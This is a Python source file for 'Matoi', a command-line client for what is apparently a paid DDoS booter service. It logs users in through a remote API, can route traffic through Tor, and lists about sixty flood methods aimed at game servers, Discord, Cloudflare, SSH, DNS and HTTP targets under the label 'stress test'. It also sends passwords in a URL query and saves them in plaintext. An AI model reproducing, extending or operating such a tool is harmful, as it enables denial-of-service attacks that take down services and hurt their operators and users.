

from colorama import Fore, Back, Style
from pystyle import Colors, Colorate
import importlib.util
import threading
import os
import pwinput
from libs.fivem import resolve_cfx_url
import subprocess
import requests
import time
import sys


userinfobanner = Colorate.Horizontal(Colors.red_to_blue, """::..-%===%%%%%*+++*####**+++++++++++++***############%%%*-::::::::::::
::::+%+%%%%#++++++++++++++++++++++****************###############*::::
...+%%%%%%++++++++++++****#####################################+::::::
..=%%@%%*++**++++**########################################%*:::::::::
..%%%%%**##***################################################+:::::::
.*%%#%########################%#######*#########################:..::.
-%%%%###############**#######=######*:*#####%####################-.::.
##%%###############==######--#####=::*##*-##%#####################=.--
##%%%############=::####*-:+##*-::::*#=::::*#+*####################+.-
##%%%##########+:::###-::::::::::::::::::::::-:-###############%####--
##%##########=:::::::::::::::::::::::::::::::::::###############--###=
##%%#######::=+-:::::-+=-::::::::::::::::::::::-::=#############+:.=#+
##%%######*+-::::::::::::-*-:::::::::::=+=-:::::::###############::.:+
##%%#######:::-+**=::::::::-*::::::==-:::::::::::-%##############---:-
###%%#####*@@@%%#**#@@#::::::::::::::::::=%@@@@@@@%#########=*###=:-==
*##%%###@%%%%:..*@@@%%%=+-::::::::::::+%@@@%:..=%@@%%%#####+-=+##=::--
+##=:####%@#...#@@%%%%@@=.+:::::::::+*%%%%@@@+...-@@%###*%+-===*#+====
+%%:=+####@*...@%%%%%%@@*.:::::::::-.#@@%@%@@%....=%%##*:*+===++#+====
%##::-####%%...-%%%%%@@%=.:::::::::..#@@@%@@@#....=%###=:=+===========
###=::*####%#....=%%%%*...::::::::::..+%%%%%+....:%####=:+========----
###%::+#####%%+..........::::::::::::...........-%#####==+=====--=+=--
%%#%%-+%#####=:-++---=-:::::::-==::::::::....:=#%%%##%#+*==========++=
+%%%%%%%%##%%#::::::::::::::::::::::::::::::::::=%%%%%#%#=======--::-=
=%%%%%%%%#%%%#-:::::::::::::::::::::::::::::::::=%%%%%#%%#*======-----
%%%%%%%%%%%%%#::::::::::::::::::::::::::::::::::#%%%%%%#*=======++++++
=*###%%%%%%%%%+:::::::::::::::::::::::::::::::-%%%%%%#*===============
======#%%%%%#%%%+::::::::::+*++-::::::::::::-#%%#%%%#%*===============
=====#%%%%%%%%%%%%#+:::::::=+++=:::::::::-*%%%###@%%##*+==============
====+##%%%%%%%###%####=+-::::::::::-+#%%%%%%%%%#%#+=============------
""")

attackbanner = Colorate.Horizontal(Colors.red_to_yellow, """            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠉⠉⠛⠛⠻⢿⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⡿⠿⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠙⢿⣿⡿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣤⣤⠄⠀⠄⠀⠀⠀⠀⠀⠀⡠⠀⡄⠀⡀⠀⠀⠀⠉⢀⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⡿⠁⢀⠊⠀⢀⡞⠁⠀⣠⠾⠃⢀⣧⠀⡷⡀⠈⡄⠀⠈⠉⣩⣿⣿⣿⣿
            ⣿⣿⣿⠁⠀⠘⠀⣠⣟⣤⣶⣿⡕⣁⡠⢾⣸⣠⣇⣵⣄⢱⠀⠀⠀⢿⣿⣿⣿⣿
            ⣿⣿⣿⣶⡖⠰⢼⡑⣥⣶⣶⣮⢢⠀⠀⠈⢝⣽⣿⣿⣍⢿⠀⡄⠀⣼⣿⣿⣿⣿
            ⣿⣿⣿⣿⣃⣴⢸⢸⣿⣿⣿⣿⢾⠀⠀⢸⢸⣿⣿⣿⣿⠸⢀⢇⡀⠛⣻⣿⣿⣿
            ⣿⣿⣿⣿⣿⢲⢿⠑⠝⢛⣛⠵⠁⣀⡀⠀⣎⣛⣟⡛⠕⣷⢯⠂⢱⢾⣿⣿⣿⣿
            ⣿⣿⣿⣏⠙⢌⣺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⣢⠐⢀⠜⡿⢿⣿⣿⣿
            ⣿⣿⣯⡈⠁⠀⣀⡱⢄⡀⠀⠀⠒⠒⠂⠀⠀⠀⣀⣠⠴⡍⡽⠁⠈⠀⠚⣿⣿⣿
            ⣿⣿⣿⣯⣉⠙⣄⠀⠀⠈⠑⠒⢤⠤⠔⠒⠚⠹⡅⢸⠀⢹⠀⠀⠀⠀⣰⣿⣿⣿
            ⣿⣿⡿⠋⠳⡤⢬⣷⡀⠀⢀⠔⠍⡓⠤⠤⠄⢒⠹⢸⠀⣀⣇⣀⠴⠊⠻⣿⣿⣿
            ⣿⢃⢄⣀⣀⣡⣰⣰⣘⣆⣎⣀⣀⣀⣉⣉⣉⣀⣀⣞⣹⣉⣍⣌⣀⣀⣀⢜⣿⣿""")

banner = Colorate.Horizontal(Colors.purple_to_blue, f"""                        ⢀⡖⠀⠈⠉⠓⠲⠦⢤⣄⣀⣀⣀⣛⣳⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠒⠚⣛⣿⣧⣀⠀⠀⠀⠀⠀⠀⠀⢩⠉⠉⠉⠉⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⣀⣤⡾⠟⠷⠾⣿⣿⣶⣦⣤⣀⡀⠀⠈⣀⣀⣠⣤⣤⣬⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠴⠚⠉⠀⣀⠀⠀⠀⠀⠉⣙⠻⢾⣿⣟⡓⠶⣿⣯⠉⠁⠈⠹⣿⠃⠈⠙⠛⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⣠⠴⠒⠛⠉⢡⠔⠛⠉⠉⠉⠁⠀⠀⠈⠙⠻⣶⣾⣿⣷⣄⠀⠀⢹⣧⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⢁⣠⠖⠋⠁⠀⠀⠀⠀⠀⣠⣀⣤⠴⣶⡖⠋⠉⠉⠀⠀⠀⠀⠉⢿⣿⡀⠀⣬⣿⣇⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣶⣦⣤⣄⡀⢀⣀⣤⡶⠚⠋⠀⣠⡴⠋⠁⠀⠀⣠⠄⢀⣤⢴⣿⣻⢈⡿⣤⣿⣿⣷⡀⠀⢰⡆⠀⠀⠀⠀⢻⣿⣴⣾⣿⣿⡄⠀⠀⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⡟⠛⠉⠉⠀⠀⠀⣠⠞⠉⠀⢀⣤⠖⠛⣡⡞⠉⢀⡾⠃⣿⣾⡥⠛⠛⢿⣌⢳⣄⠈⢷⡀⠀⠀⠀⠀⢻⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣆⡀⠀⠀⣠⠞⠁⠀⣠⣶⡏⠁⢀⣼⡏⠀⣰⠟⢁⡼⠟⠉⠀⠀⠀⠀⠀⡀⠉⢷⣼⣇⠀⠀⠀⠀⠈⢻⣿⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣦⣘⡋⢀⣴⠞⠁⢸⡇⢀⡾⢹⢃⣴⠋⣠⠎⠀⠀⠀⠀⠀⢀⣀⣼⣇⣠⣾⡿⣿⠀⠀⠀⠀⠀⠀⢻⣧⣨⣽⣷⣄⡀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
⢿⡟⠉⠻⣿⣿⣿⡿⢻⠟⠁⠀⠀⣿⡇⣼⠃⣼⠟⠁⡼⠃⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⡇⢸⠀⠀⠀⠀⠀⠀⣸⡿⠋⠀⢀⡌⠻⣆⠀⠀⠀⠀⠘⣧⠀⠀⢀⣤⣾⠀⠀⠀⠀   
⠸⠁⠀⠀⠀⢽⡿⠁⠀⠀⠀⠀⠀⣿⢿⡇⠀⠁⠀⠐⠃⠀⢀⣾⠟⠋⡼⠻⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⠀⠀⠀⢸⠏⠀⢠⠞⠉⠀⠀⠹⡄⠀⠀⠀⠀⠛⠒⠚⠋⢁⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣾⡇⠀⠀⢠⠀⠀⠀⢿⠳⡅⠀⠀⠀⠀⠀⢀⡿⠁⠀⠀⡇⣠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢸⢸⠀⢠⠿⢦⡀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠃⠀⣠⣾⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⣾⡀⠁⠀⠈⢻⡀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣠⡾⠻⣿⠀⠀⠀⣿⣷⣴⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⠿⠛⣿⡟⣿⠀⠀⠀⠀⠀⠿⣇⠀⠀⢠⡞⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠻⢤⣤⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠸⠟⠁⠘⣿⠀⠀⣰⣿⢿⣿⣿⡻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡿⠟⠛⣧⠀⠀⠀⠀⠀⠀⢹⡀⡴⠋⠀⠀⠀⢀⡾⠃⠀⠀⣀⣀⣀⣀⣀⣀⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣆⣴⠟⠙⢷⣽⣿⣹⣿⡀⠀⠀⠀⠀⠀⠀⠓⠒⠶⠒⠋⠁⠀⠀⠀⠘⣧⣄⠀⠀⠀⠀⠈⣷⡄⠀⣀⣴⠶⠋⠡⣤⡔⠋⠉⠁⠀⠀⠀⣠⡾⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠏⠀⠀⠀⣈⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣆⠀⠀⠀⠀⣸⢿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡟⣷⠀⠀⢠⠇⢘⡇⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⣀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠘⣧⢠⠏⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠳⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⣃⣴⠟⠁⠀⠀⠀⠀⠀⠠⣤⣤⣤⠤⠴⠖⠚⠻⠆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢾⠃⠀⣠⠟⢧⣄⠀⠀⠀⠰⣶⣤⣀⣈⣻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⠁⢿⠀⣰⠏⠀⠀⠹⣿⣶⣤⣀⣈⣻⡍⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠳⠤⢤⣀⣀⣀⣀⣤⡴⢾⣿⡿⠃⠀⠀⠈⢷⣏⣀⣠⡤⠶⠛⠛⠉⠙⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⡾⠋⠀⠀⠀⠀⠀⠈⣿⠁⢀⣤⣴⣾⠿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣠⣿⠀⠀⠀⠀⠀⠀⠀⠀⣼⣞⡿⠞⠋⠀⢀⣀⣀⣤⡴⠞⠛⠛⠷⣤⡀⠀⠀⠈⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⡀⠀⠀⠀⠀⠀⣀⡴⠟⠋⣀⣤⠶⠛⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠾⣋⣤⣶⠞⠋⠀⢀⣴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣟⣽⡿⠛⣩⠞⠁⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠘⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠉⠙⠚⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠉⠉⠓⢲⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀
                        𝕸𝖆𝖙𝖔𝖎 𝕹𝖊𝖙𝖜𝖔𝖗𝖐 ⚡
                               ᴠᴇʀsɪᴏɴ: 1.0""".center(100), 1)


login2 = Fore.YELLOW + """███╗   ███╗ █████╗ ████████╗ ██████╗ ██╗
████╗ ████║██╔══██╗╚══██╔══╝██╔═══██╗██║
██╔████╔██║███████║   ██║   ██║   ██║██║
██║╚██╔╝██║██╔══██║   ██║   ██║   ██║██║
██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║
╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝
                                         """ + Fore.RESET



def login(node, user=None, password=None):
    tor = "off"

    if os.path.exists('login.txt'):
        with open('login.txt', 'r') as file:
            credentials = file.read().strip().split(':')
            if len(credentials) == 2:
                user, password = credentials[0], credentials[1]
                os.system("cls")
                print("Using saved credentials for login.")
            else:
                os.system("cls")
                print("Invalid credentials in login.txt. Please log in manually.")
                return

    if user is None or password is None:
        os.system("cls || clear")
        print(login2)
        print("Welcome! Please login to your account, after this you will be logged autmaticaly!")
        print("")
        user = input("Enter username: ")
        password = pwinput.pwinput(prompt = 'Enter the password: ', mask='*')

    api_url = f"https://api.failed.lol/matoi/start?node={node}&user={user}&password={password}"
    
    try:
        response = requests.get(api_url)
        
        if response.status_code == 508:
            data = response.json()
            
            if "valid" in data and data["valid"]:
                print("Login successful!")
                with open('login.txt', 'w') as file:
                    file.write(f"{user}:{password}")
                clear(user, password, tor)
            else:
                print("Invalid user or incorrect credentials.")
                if os.path.exists('login.txt'):
                    os.remove('login.txt')
        else:
            print(f"Error: Received status code {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def start_tor():
    tor_path = "tor.exe"
    tor_process = subprocess.Popen([tor_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)
    return tor_process

def tor_request(url):
    proxies = {
        'http': 'socks5://127.0.0.1:9050',
        'https': 'socks5://127.0.0.1:9050'
    }
    try:
        response = requests.get(url, proxies=proxies, timeout=30)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def load_addon(addon_name):
    try:
        spec = importlib.util.spec_from_file_location(addon_name, f"addons/{addon_name}.py")
        addon_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(addon_module)

        if hasattr(addon_module, 'run'):
            threading.Thread(target=addon_module.run).start()
        else:
            print(f"{Fore.RED}Addon '{addon_name}' does not have a 'run' function.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Failed to load addon '{addon_name}': {e}{Fore.RESET}")

def clear(user, password, tor):
    os.system("cls")
    startup(user, password, tor)

def startup(user, password, tor):
    print(Style.RESET_ALL)
    os.system("title Matoi network attack system!")
    print(banner)
    print("")
    print(f"                {Fore.WHITE}Type `{Fore.LIGHTMAGENTA_EX}help{Fore.WHITE}` to display available commands.")
    print("")
    main(user, password, tor)

def main(user, password, tor):
    command = input(f"{Back.MAGENTA}{user} </> Matoi {Back.RESET}{Fore.RESET} ")
    if command == "methods":
        print("")
        print(f" {Fore.WHITE}| OVHTCP      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| OVHUDP      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPPLAIN    {Fore.WHITE}[{Fore.YELLOW}UNPROT / PROT{Fore.WHITE}]  - Udp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPBYPASS   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udp Bypass | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPKILLER   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udp Killer | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPAMP      {Fore.WHITE}[{Fore.YELLOW}UNPROT / PROT{Fore.WHITE}]  - Udp Amplification | Duration: 120 sec")
        print(f" {Fore.WHITE}| OPENVPN     {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - OpenVPN Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| GAME        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Game Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPBYPASS   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Bypass | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPKILLER   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Killer | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPMATOI    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Matoi | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCP         {Fore.WHITE}[{Fore.YELLOW}UNPROT / PROT{Fore.WHITE}]  - Tcp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| HANDSHAKE   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Handshake Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| SSHKILLER   {Fore.WHITE}[{Fore.RED}UNPROT{Fore.WHITE}]            - Ssh Killer | Duration: 120 sec")
        print(f" {Fore.WHITE}| DISCORD     {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Discord Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| SUBNET      {Fore.WHITE}[{Fore.YELLOW}UNPROT / PROT{Fore.WHITE}]  - Subnet Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| R6          {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - R6 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| FIVEM       {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - FiveM Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| WARZONE     {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Warzone Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| DAYZ        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - DayZ Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| FORTNITE    {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Fortnite Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| PUBG        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Pubg Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| CSGO        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - CSGO Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| APEX        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Apex Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| RUST        {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Rust Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| OVERWATCH   {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Overwatch Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| TLS         {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tls Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| BYPASS      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Bypass Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| CLOUDFLARE  {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Cloudflare Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| HTTP        {Fore.WHITE}[{Fore.RED}UNRPOT{Fore.WHITE}]            - Http Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| HTTPS       {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Https Attack | Duration: 120 sec")
        print(f" {Fore.WHITE}| BROWSER     {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Browser Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPWRA      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Wra Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPTFO      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Tfo Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| ACKCHINA    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Ack China Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| GUDP        {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Gudp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| GAMEv2      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Gamev2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCP-WRA     {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Wra Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| FORTNITEv2  {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Fortnitev2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| OVHTCPv2    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Ovh Tcpv2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| WARZONEv2   {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Warzonev2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| FIVEMv2     {Fore.WHITE}[{Fore.MAGENTA}GAME{Fore.WHITE}]          - Fivemv2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| DISCORDv2   {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Discordv2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPPLAINv2  {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udpplainv2 Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| SOCKET      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Socket Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDP-RAW     {Fore.WHITE}[{Fore.RED}UNPROT{Fore.WHITE}]            - Udp-Raw Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPPPS      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udppps Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| TCPTLS      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Tcp Tls Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| ACK         {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Ack Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| SYN         {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Syn Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| MIXAMP      {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Mixamp Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| DNS         {Fore.WHITE}[{Fore.RED}UNPROT{Fore.WHITE}]            - Dns Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| UDPCHINA    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Udpchina Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| HTTP-MATOI  {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Http-Matoi Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| MISC        {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Misc Flood | Duration: 120 sec")
        print(f" {Fore.WHITE}| HTTP-TOR    {Fore.WHITE}[{Fore.GREEN}PROTECTED{Fore.WHITE}]       - Http-Tor Flood | Duration: 120 sec")
        print("")
        main(user, password, tor)
    if command == "help":
        print("")
        print(f"{Fore.LIGHTMAGENTA_EX}methods{Fore.RESET}    - Shows methods list            - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}attack{Fore.RESET}     - Stress test command           - {Fore.WHITE}D{Fore.RESET}")
